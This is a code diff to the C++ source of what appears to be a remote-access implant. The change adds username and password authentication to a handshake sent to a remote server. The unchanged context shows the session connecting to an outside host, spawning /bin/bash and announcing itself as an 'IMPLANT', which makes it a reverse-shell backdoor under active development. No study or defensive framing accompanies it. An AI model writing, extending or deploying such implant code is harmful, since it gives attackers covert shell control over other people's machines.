@@ -3,6 +3,7 @@
 #include "Logger.hpp"
 #include <Remote.hpp>
 #include <Shell.hpp>
+#include <SessionHandshake.hpp>
 #include <chrono>
 #include <string>
 
@@ -17,15 +18,26 @@ private:
     std::string host;
     int port;
     std::string session_id;
+    std::string username;
+    std::string password;
 
 public:
     //-------------------------------------------------
     //
     //-------------------------------------------------
-    RemoteSession(std::string id, std::string h, int p, std::atomic<bool>& run)
-        : global_running(run), host(h), port(p), session_id(id) {
-
-    }
+    RemoteSession(
+        std::string id,
+        std::string h,
+        int p,
+        std::string user,
+        std::string pass,
+        std::atomic<bool>& run)
+        : global_running(run),
+          host(std::move(h)),
+          port(p),
+          session_id(std::move(id)),
+          username(std::move(user)),
+          password(std::move(pass)) {}
 
     //-------------------------------------------------
     //
@@ -37,8 +49,7 @@ public:
             cpppwn::Process shell("/bin/bash", {"/bin/bash"});
             logger::debug("Session {}: Connection established and shell spawned.", session_id);
 
-            //identify to the server
-            conn.sendline("IMPLANT");
+            session_handshake::send(conn, session_handshake::implant_role, username, password);
 
             logger::debug("global_running: {} | Connection: {} | Shell: {}", global_running ? "TRUE" : "FALSE", conn.is_alive() ? "TRUE" : "FALSE", shell.is_alive() ? "TRUE" : "FALSE");
 
@@ -79,15 +90,20 @@ public:
     //-------------------------------------------------
     //
     //-------------------------------------------------
-    void start_session(const std::string& id, const std::string& host, int port) {
+    void start_session(
+        const std::string& id,
+        const std::string& host,
+        int port,
+        const std::string& username,
+        const std::string& password) {
         std::lock_guard lock(mtx);
         if (sessions.contains(id)) return;
 
         auto entry = std::make_unique<SessionEntry>();
 
         // Spawn the shell thread
-        entry->worker = std::thread([id, host, port, &run = entry->running_flag]() -> void {
-            RemoteSession session(id, host, port, run);
+        entry->worker = std::thread([id, host, port, username, password, &run = entry->running_flag]() -> void {
+            RemoteSession session(id, host, port, username, password, run);
             session.run();
         });
 
